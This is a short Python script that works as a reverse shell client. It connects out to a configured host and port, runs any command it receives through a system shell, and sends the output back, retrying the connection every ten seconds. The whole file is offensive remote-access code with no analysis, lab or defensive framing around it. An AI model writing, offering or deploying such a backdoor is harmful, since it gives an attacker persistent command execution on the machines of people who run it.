#!/usr/bin/python3

import os, socket, subprocess, time

HOST = '0.0.0.0'
PORT = 3000

def shell(cmd)  :
    global s

    if cmd == 'cwd':
        dirc = os.getcwd()
        s.send(dirc.encode())

    elif cmd[:2] == 'cd' :
        try :
            os.chdir(cmd[3:])
            s.send(b'ok')
        except Exception as ex :
            s.send(ex.encode())
    else :
        # cmd = cmd.split(' ')
        result = subprocess.Popen(cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE )
        output = result.stdout.read() + result.stderr.read()
        s.send(output)


def connect() :
    global s

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))

    while True :
        data = s.recv(4028)
        shell(data.decode())

if __name__ == '__main__' :
    while True :
        try :
            connect()
        except :
            time.sleep(10)
